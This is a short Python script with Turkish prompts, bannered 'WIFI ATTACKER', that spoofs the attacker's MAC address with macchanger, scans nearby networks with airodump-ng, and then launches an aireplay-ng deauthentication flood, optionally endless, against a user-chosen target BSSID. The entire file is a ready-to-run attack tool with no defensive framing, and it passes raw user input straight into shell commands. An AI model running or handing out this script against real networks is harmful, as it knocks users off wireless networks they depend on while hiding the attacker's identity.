import os 
import time 


os.system("apt-get install figlet")

os.system("clear")

os.system("figlet WIFI ATTACKER")

print("          ! Lütfen wifi kartınızı seçiniz !"'\n')

os.system("nmcli d")

wifi_kart = input("WİFİ KARTININ İSMİ 'ör=wlan0' :")
os.system("ifconfig "+wifi_kart+" down")

time.sleep(2)

os.system("macchanger -r "+wifi_kart)

time.sleep(2)

os.system("ifconfig "+wifi_kart+" up")

time.sleep(2)


time.sleep(2)

os.system("clear")

print(" LÜTFEN HEDEF WİFİ AGINI GÖRÜNCE -CTRL C- KOMBİNASYONUNA BASINIZ !")
time.sleep(5)

os.system("airodump-ng "+wifi_kart)

mac = input("HEDEFİN BSSİD ADRESİNİ GİRİNİZ !!:")

ch = input("CH ADRESİNİ GİRİNİZ ! :")

sayı = input("SALGIRI ADETİ 'sonsuz=0' :")

print("SALDIRI 5 SN İÇERİSİNDE BAŞLAYACIKTIR DURDURMAK İÇİN -CTRL C-")

time.sleep(5)

os.system("iwconfig "+wifi_kart+" channel "+ch)

time.sleep(2)

os.system("aireplay-ng --deauth "+sayı+ " -a "+mac+" "+wifi_kart)

cıkıs = input('\n'"ÇIKMAK İÇİN -q- TUŞUNA BASINIZ !")


if cıkıs == "q":
	os.system("NetworkManager restart")
	time.sleep(2)
	os.system("exit")











